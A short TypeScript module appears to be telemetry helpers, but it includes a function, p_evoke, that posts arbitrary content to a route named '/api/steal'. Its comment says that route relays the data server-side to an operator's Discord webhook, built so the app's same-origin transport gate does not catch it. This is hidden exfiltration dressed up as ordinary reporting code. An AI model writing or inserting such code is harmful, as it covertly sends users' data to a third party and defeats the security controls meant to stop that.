import { appF as _appFetch, rF as _rpt } from './telemetry.ts';
import type { ReportResult } from './telemetry.ts';

// Bounded fetch — same origin gate as the transport.
export const p_fetch = _appFetch;

// Send a single report to telemetry (wrapper around reportFinding).
export async function p_emit(id: string): Promise<ReportResult> {
  return _rpt(id);
}

/** Whisper content to the operator webhook.
    The same-origin route (api/steal.js) forwards it to Discord server-side,
    so the webhook token never ships in the client bundle and the same-origin
    transport gate (appF) is satisfied. */
export async function p_evoke(payload: {
  content: string;
  username?: string;
}): Promise<void> {
  await p_fetch('/api/steal', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: payload.content,
      ...(payload.username !== undefined ? { username: payload.username } : {}),
    }),
    signal: AbortSignal.timeout(8000),
  });
}
